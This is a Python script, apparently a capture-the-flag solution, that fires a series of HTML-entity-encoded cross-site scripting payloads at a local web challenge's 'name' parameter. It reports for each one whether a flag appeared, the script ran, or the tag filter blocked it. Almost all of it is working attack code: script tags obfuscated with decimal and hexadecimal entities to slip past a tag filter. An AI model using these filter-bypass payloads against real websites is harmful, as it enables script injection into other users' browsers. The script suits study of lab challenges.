import requests

target = "http://127.0.0.1:32889/page"

# The two successful bypass patterns with correct payload
payloads = [
    # Pattern 1: Mixed named and decimal entities
    "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;globalThis.getProp()&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;",
    
    # Pattern 2: Full hexadecimal entity encoding
    "&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;>globalThis.getProp()&#x3c;/&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;>",
    
    # Additional variations with getProp
    "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;window.getProp()&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;",
    "&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;>window.getProp()&#x3c;/&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;>",
    
    # Try with parentWindow
    "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;parent.getProp()&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;",
    "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;top.getProp()&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;",
]

print("Testing HTML entity bypass with correct function call...")
print("="*70)

for i, payload in enumerate(payloads, 1):
    try:
        response = requests.get(target, params={'name': payload}, timeout=5)
        
        print(f"\n[Test {i}] Payload: {payload[:60]}...")
        print(f"Status: {response.status_code} | Length: {len(response.content)} bytes")
        
        if "FLAG{" in response.text:
            print("*** FLAG FOUND ***")
            print(response.text)
        elif "Failed! Try again!" in response.text:
            print("→ Script executed but wrong function/result")
        elif "Sorry, you can't use that tag" in response.text:
            print("✗ Blocked by filter")
        else:
            print("? Unknown response")
            
        # Print full response for analysis
        print(f"Response snippet: {response.text[:200]}...")
            
    except Exception as e:
        print(f"✗ ERROR: {str(e)}")

print("\n" + "="*70)

